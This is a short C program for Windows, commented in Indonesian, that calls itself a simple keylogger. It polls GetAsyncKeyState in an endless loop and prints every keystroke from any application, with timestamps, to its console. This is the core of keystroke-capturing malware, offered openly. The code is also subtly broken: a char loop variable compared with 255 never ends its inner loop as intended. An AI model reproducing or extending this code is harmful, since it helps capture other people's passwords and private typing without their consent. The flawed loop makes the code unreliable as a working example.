/*Program menampilkan karakter yang di ketikkan pada keyboard  */
//program keylogger sederhana yang menampilkan keyboard di layar

#include <stdio.h>
#include <windows.h>
#include <time.h>

#define keypressStateCode -32767

int main() {
	
	fprintf(stdout, "mulai\r\n");
	fprintf(stdout, "[%u] : keylogger sederhana\r\n", (unsigned)time(NULL) );
	
	char pressedKey;
	
	while (1) {
		
		for (pressedKey = 8; pressedKey <= 255; pressedKey++) {
			if (GetAsyncKeyState(pressedKey) == keypressStateCode) {
				fprintf(stdout, "\r\n[%u] : ", (unsigned)time(NULL));
				
				switch ((int)pressedKey){
					case ' ':
						fprintf(stdout, "SPACE");
						break;
					case 9:
						fprintf(stdout, "TAB");
						break;
					case 13:
						fprintf(stdout, "ENTER");
						break;
					case 27:
						fprintf(stdout, "ESC");
						break;
					case 8:
						fprintf(stdout, "BACKSPACE");
						break;
					default:
						fputc(pressedKey, stdout);
						break;
						
				}
			}
		}
		
	}
	
	return 0;
}
